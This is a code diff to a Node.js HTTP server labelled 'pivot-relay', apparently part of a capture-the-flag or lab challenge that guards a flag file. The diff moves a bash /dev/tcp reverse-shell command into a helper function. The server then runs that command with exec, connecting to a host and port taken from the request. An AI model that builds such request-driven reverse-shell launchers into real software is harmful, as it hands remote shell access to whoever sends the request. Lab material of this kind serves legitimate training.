@@ -46,6 +46,10 @@ function portOk(value) {
   return Number.isInteger(port) && port > 0 && port <= 65535;
 }
 
+function reverseShellLaunchCommand(host, port) {
+  return `nohup bash -lc 'exec bash -i >& /dev/tcp/${host}/${port} 0>&1' >/dev/null 2>&1 </dev/null &`;
+}
+
 function lockFinalFlag() {
   fs.mkdirSync(path.dirname(FLAG_PATH), { recursive: true, mode: 0o700 });
   fs.writeFileSync(FLAG_PATH, `${PIVOT_FLAG}\n`, { mode: 0o600 });
@@ -98,7 +102,7 @@ const server = http.createServer(async (req, res) => {
     }
 
     const port = Number.parseInt(String(payload.port), 10);
-    const command = `setsid bash -lc 'exec bash -i >& /dev/tcp/${payload.host}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown`;
+    const command = reverseShellLaunchCommand(payload.host, port);
     exec(command, { shell: '/bin/sh', timeout: 15_000 }, (error) => {
       if (error) console.log(`[pivot-relay] callback launch failed: ${error.message}`);
     });
